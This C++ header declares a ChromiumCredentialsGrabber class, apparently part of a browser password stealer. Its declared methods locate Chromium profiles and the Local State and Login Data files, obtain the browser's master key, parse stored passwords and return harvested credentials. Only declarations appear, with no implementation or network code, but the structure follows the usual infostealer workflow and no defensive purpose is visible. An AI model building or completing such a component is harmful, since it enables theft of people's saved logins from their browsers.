#pragma once
#include "CredentialsGrabber.hpp"
#include "Json.hpp"

#include <filesystem>

class ChromiumCredentialsGrabber : public CredentialsGrabber
{
public:
	explicit ChromiumCredentialsGrabber(std::filesystem::path app_root);
	~ChromiumCredentialsGrabber() override = default;
	ChromiumCredentialsGrabber(const ChromiumCredentialsGrabber&) = delete;
	ChromiumCredentialsGrabber& operator=(const ChromiumCredentialsGrabber&) = delete;
	ChromiumCredentialsGrabber(ChromiumCredentialsGrabber&&) = delete;
	ChromiumCredentialsGrabber& operator=(ChromiumCredentialsGrabber&&) = delete;

	[[nodiscard]] std::optional<Credentials> grab_credentials() const override;

private:
	[[nodiscard]] static std::tuple<Buffer, Buffer> parse_password(const Buffer& password);
	[[nodiscard]] static std::optional<Time::Datetime> convert_datetime(int64_t webkit_datetime);

	[[nodiscard]] virtual std::filesystem::path get_user_data_path(const std::filesystem::path& app_root) const;
	[[nodiscard]] virtual std::filesystem::path get_local_state_path(const std::filesystem::path& app_root) const;
	[[nodiscard]] virtual std::filesystem::path get_login_data_path(const std::filesystem::path& app_root,
	                                                                const std::wstring& profile) const;

	class LocalState final
	{
	public:
		explicit LocalState(Json local_state);
		~LocalState() = default;
		LocalState(const LocalState&) = delete;
		LocalState& operator=(const LocalState&) = delete;
		LocalState(LocalState&&) = delete;
		LocalState& operator=(LocalState&&) = delete;

		[[nodiscard]] std::vector<std::wstring> get_user_profiles() const;
		[[nodiscard]] Buffer get_master_key() const;

		[[nodiscard]] static LocalState from_path(const std::filesystem::path& local_state_path);

	private:
		Json m_local_state;
	};

	std::filesystem::path m_app_root;
};
